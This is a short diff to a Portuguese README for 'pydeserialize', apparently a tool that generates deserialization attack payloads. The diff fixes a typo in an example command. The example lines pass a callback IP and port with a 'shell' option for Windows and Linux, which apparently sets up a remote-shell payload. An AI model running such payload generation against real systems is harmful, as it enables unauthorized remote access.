@@ -29,7 +29,7 @@ Projetei o `pydeserialize` para cumprir todas as responsabilidades para gera pay
 
 ```sh
 pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
-pydeserialize -ip 192.168.4.113 -e b64-p 80 -o Linux
+pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux
 ```
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
